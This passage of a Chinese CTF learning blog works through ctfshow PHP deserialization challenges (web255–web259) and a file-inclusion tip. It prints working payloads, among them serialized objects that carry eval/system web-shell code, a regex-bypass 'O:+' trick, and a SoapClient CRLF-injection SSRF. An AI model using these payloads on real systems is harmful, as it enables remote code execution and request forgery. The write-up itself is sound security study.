operator">></span><span class="token comment">//测试内容:</span><span class="token operator">></span><span class="token comment">/* >f=php://filter/string.rot13/resource=1.php>c=&lt;?cuc flfgrz("qve");?>>Windows下需要将short_open_tag关闭>*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/dongguol/p/5910617.html#:~:text=%E6%9C%80%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AF%E7%9F%AD%E6%A0%87%E7%AD%BE%E5%BC%95%E8%B5%B7%E7%9A%84%EF%BC%8CWindows%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9F%AD%E6%A0%87%E7%AD%BE%E9%BB%98%E8%AE%A4%E6%98%AF%E6%89%93%E5%BC%80%E7%9A%84%EF%BC%8CLinux%E4%B8%8B%20%E9%BB%98%E8%AE%A4%E6%98%AF%E5%85%B3%E9%97%AD%E7%9A%84%E3%80%82%20%E6%8E%A7%E5%88%B6%E5%8F%82%E6%95%B0%EF%BC%9A%20short_open_tag%20%3D%20On%20%E5%A6%82%E6%9E%9C%E8%AE%BE%E7%BD%AE%E4%B8%BAOff%EF%BC%8C%E5%88%99%E4%B8%8D%E8%83%BD%E6%AD%A3%E5%B8%B8%E8%A7%A3%E6%9E%90%E7%B1%BB%E4%BC%BC%E4%BA%8E%E8%BF%99%E6%A0%B7%E5%BD%A2%E5%BC%8F%E7%9A%84php%E6%96%87%E4%BB%B6%EF%BC%9A%20phpinfo,%E8%80%8C%E5%8F%AA%E8%83%BD%E8%A7%A3%E6%9E%90%20%3C%3Fphp%20phpinfo%20%28%29%20%3F%3E%20%E8%BF%99%E6%A0%B7%E5%BD%A2%E5%BC%8F%E7%9A%84php%E6%96%87%E4%BB%B6%20%E6%89%80%E4%BB%A5%E8%A6%81%E6%83%B3php%E6%94%AF%E6%8C%81%E7%9F%AD%E6%A0%87%E7%AD%BE%EF%BC%8C%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E6%8A%8Ashort_open_tag%20%E8%AE%BE%E7%BD%AE%E4%B8%BAOn.">php的short_open_tag </a></p><p><a href="https://www.freebuf.com/articles/web/266565.html">rot13编码</a></p></blockquote><p><a href="https://xz.aliyun.com/t/8163#toc-3">PHP协议绕过死亡过滤</a></p><p><a href="https://blog.csdn.net/gental_z/article/details/122303393">PHP的filter总结</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p><h2 id="文件包含总结一波"><a href="#文件包含总结一波" class="headerlink" title="文件包含总结一波"></a>文件包含总结一波</h2><p><strong>1.文件包含需要完整的文件路径，无法使用通配符</strong></p><p><strong>2.转码可以使用php:&#x2F;&#x2F;filter和data:&#x2F;&#x2F;text&#x2F;palin;</strong></p><p><strong>3.处理数据可以使用data:&#x2F;&#x2F;协议</strong></p><p><strong>4.base64编码最后的” &#x3D; “是用于补充字符，删除仍可以编码</strong></p><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现条件是打印flag的条件是需要输入$username和$password，同时需要满足checkVip()和login()返回true，发现login很容易处理，但是checkVip()的返回是原来定义的false，导致无法打印flag。但是可以通过$user的反序列对其变量结果进行改变，题目的要求就对cookie的传入值进行反序列改变$user的值。（<strong>cookie值需要通过URL传入才能显示原始值，尝试了发现直接输入是无法全部识别的</strong>），序列化对象也是将对象的变量进行字符串化保存，但是对象的状态需要和原来相同(即对象名，对象变量的访问权限需要相同)</p><blockquote><p>序列化$user的$isVip：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token operator">></span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$isVip</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token comment">//得到需要的：O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309102059836.png"></p><p>比上面多了一个条件就是要求最后的判断$username 和 $password不相同，一开始我以为需要将$username的x弄少一个和password不相同然后传入的两个参数相同x就可以了，测试后发现不行。最后看了wp后理解了<strong>反序列的结果会改变对象的值，即反序列化后获得的值就是新的对象变量值</strong>。login函数的意思就是传入的参数和对象变量的对应值相同才可以通过，那么就可以修改序列化的$username和get参数username相同，和password不同即可以，$password和password也是如此。</p><blockquote><p>wp如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token operator">></span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xxxxxa'</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$isVip</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token comment">//user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxa%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxa</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/316200445">理解序列化和反序列化</a></p><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111051636.png"></p><p>该题目新增了魔法函数，大概介绍放在了下面，这题目主要是通过调用getInfo()方法执行命令，那么需要调用该方法就需要创建backDoor对象。但是题目创建的对象是info类的，所以需要修改创建类的对象，后来发现调用getInfo()需要执行__destruct()方法，不太懂这个内容，就查了资料，发现当重新赋值的时候或者对象的变量都被删除的时候会自动调用，那么就很容易了，因为重新创建对象，那么原来对象的变量就都没有了，所以反序列编写如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span><span class="token punctuation">;</span><span class="token comment">//尝试了发现public权限也可以，可能是</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac flag.php');"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>**__construct()**是使用关键字new实例化对象时会自动调用构造方法</p><p><strong><code>__destruct()</code></strong> 是PHP面向对象编程的另一个重要的魔法函数，该函数会在到某个对象的所有引用都被删除或者当对象被显式<strong>销毁</strong>时执行（对象被“销毁”是指不存在任何对该对象的引用，比如引用该对象的变量被删除(unset)、<strong>重新赋值</strong>或脚本执行结束）</p></blockquote><p><a href="https://blog.csdn.net/hrbsfdxzhq01/article/details/88871906">魔法函数</a></p><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111638012.png"></p><p>这题多加了一个正则表达式过滤，大概意思就是如果匹配到<strong>O&#x2F;C(大小写):1个或更多连续的数字</strong>，$user就无法获得反序列的值，那么就无法修改对象的值。新手不知道序列化，然后参考了资料，发现了一些<a href="https://www.cnblogs.com/zesiar0/p/12698547.html">内容利用</a></p><blockquote><p><strong>O:11:”ctfShowUser”</strong></p><p>反序列化过程中，会先检测第一个” O “，检测通过就会跳到下一个检测“ : ”，通过后就开始检测这个问题地方了，它会检测这个” : “后是否为数字，如果是则通过，如果不是则停止，但是遇到了“ + ”时，它会跳转到一个中缓位置，继续检测下一个位置是否为数字，如果是也会继续通过，所以可用绕过正则表达式的过滤。【<strong>PHP5可尝试</strong>】</p></blockquote><p>后来做的时候发现了还是错了，原来是$code的权限被修改public，这个也会影响反序列化结果。</p><blockquote><p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同</p><p>public(公有)  protected(受保护)     <em>&#x2F;&#x2F; %00*%00属性名</em> private(私有的)       <em>&#x2F;&#x2F; %00类名%00属性名</em></p></blockquote><p>最后构建的POC为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$class</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system($_POST["shell"]);'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'O:+'</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C:'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'C:+'</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A24%3A%22system%28%24_POST%5B%22shell%22%5D%29%3B%22%3B%7D%7D</span><span class="token comment">//最后看到版本为5.6.40</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://deerchao.cn/tutorials/regex/regex.htm#mission">正则表达式学习</a></p><p><a href="https://blog.csdn.net/lhx1026/article/details/83464198">序列化格式</a></p><h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">>//flag.php的内容><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token comment">//index.php的内容</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token operator">></span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token comment">//vip can get flag one key</span><span class="token operator">></span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>菜鸟表示看不懂，直接看wp学习一波知识吧。</p><blockquote><p>知识：</p><p>一、PHP连接web服务需要通过soapclient（soap是简单对象访问协议）</p><p>二、array_pop()函数：去除数组最后一个元素，返回数组的最后一个值。如果数组是空的，或者非数组，将返回 NULL</p><p>三、file_put_contents函数：把第二个参数写入第一个参数的文件中</p><p>四、explode()函数：把字符串打散为数组（题目是按” , “分隔开的，所以传入需要使用” ，”）</p><p>五、Cloudflare的反向代理会导致网站收到用户的IP地址不是真实IP地址，有利于保护网站的安全和有隐私</p><p>六、SoapCilent原生类__call：在对象中调用一个不存在方法时向ip发送请求，其中会出现SOAPAction处可控，当把<strong>\r\n</strong>注入到SOAPAction，POST请求的header就可以被控制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1:5555'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$c</span><span class="token operator">-></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309112115244.png"></p><p>七、<strong>user_agent</strong>可以注入<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a>，控制后面的信息(HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来)</p></blockquote><p>写自己的思路，通过了解Cloudflare反向代理直接抓取包修改xff是无法通过本地构造XFF绕过，因为它会接受来自 Cloudflare 边缘节点的 IP 地址，而不是用户的真实IP地址，但是可用通过PHP原生类的反序列化来实现<a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF</a>，题目也是如此的想法，用soapclient和__call打组合拳。测试soapclient使用上面的<strong>第六点</strong>代码，发现了SOAPAction在Content-Type的下面，这会导致无法修改Content-Type的值，即无法操作POST值，题目需要传入POST值为token&#x3D;ctfshow（POST的形式需要application&#x2F;x-www-form-urlencoded），发现还可以从UA下手，像上面的<strong>第七点</strong>使用\r\n实现修改值，地址需要通过127.0.0.1访问flag.php，于是实现最后的POC，传参访问flag.txt就是了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$ua</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"adc\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow"</span><span class="token punctuation">;</span>    <span class="token comment">////token前面使用两个\r\n是因为需要和hearder区分，POST是body部分</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token variable">$ua</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$client</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意点：</strong></p><p>1.Content-Length: 13是因为只取后面13位即刚刚好是ntoken&#x3D;ctfshow，是严格限定的内容（token&#x3D;ctfshow下面的将被抛弃）</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309112219472.png"></p><p>2.soapclent的参数问题</p><blockquote><p>location：指定要访问的 SOAP 服务的位置（URL）</p><p>uri：指定要用于 SOAP 请求和响应的 XML 命名空间&#x2F;&#x2F;如果没有将无法发送请求到正确的服务端点</p><p>user-agent不是规定的参数，可以通过 stream_context_create自定义，否则会出现报错supplied argument is not a valid Stream-Context resource</p></blockquote><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">wp1</a></p><p><a href="https://www.cnblogs.com/Foreverwlwl/p/17505094.html">更详细内容wp</a></p><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><p><img 